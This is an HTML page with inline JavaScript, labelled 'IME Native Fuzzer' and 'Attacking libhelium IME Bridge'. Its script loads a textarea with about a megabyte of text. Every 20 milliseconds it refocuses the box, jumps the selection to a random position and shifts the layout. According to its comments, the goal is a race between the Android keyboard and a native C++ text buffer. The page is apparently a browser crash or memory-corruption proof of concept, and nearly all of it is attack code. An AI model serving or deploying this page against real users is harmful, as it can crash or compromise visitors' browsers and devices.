<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>IME Native Fuzzer</title>
</head>
<body style="background:#000; color:#f00; font-family:monospace;">
    <h3>Attacking libhelium IME Bridge...</h3>
    
    <textarea id="pwnbox" style="width:100%; height:300px; font-size:20px;"></textarea>

    <script>
        const box = document.getElementById('pwnbox');
        
        // 1. Create a 1MB string. This is small enough to avoid the Java GC panic, 
        // but huge for a native C++ text buffer.
        const giantText = "A".repeat(500000) + " PWNED " + "B".repeat(500000);
        box.value = giantText;

        function triggerIME() {
            // 2. Force the Android Keyboard to wake up and attach to the C++ WebContents
            box.focus();
            
            // 3. Rapidly change the cursor position.
            // This forces Blink to execute onSurroundingTextReceived via JNI constantly.
            let pos = Math.floor(Math.random() * 900000);
            box.setSelectionRange(pos, pos + 50);

            // 4. Thrash the DOM. This forces the C++ engine to recalculate layout 
            // while the keyboard is actively trying to read the memory pointer.
            box.style.transform = `translateY(${Math.random() * 10}px)`;
        }

        // Fire the IME extraction requests aggressively (every 20ms)
        setInterval(triggerIME, 20);

    </script>
</body>
</html>
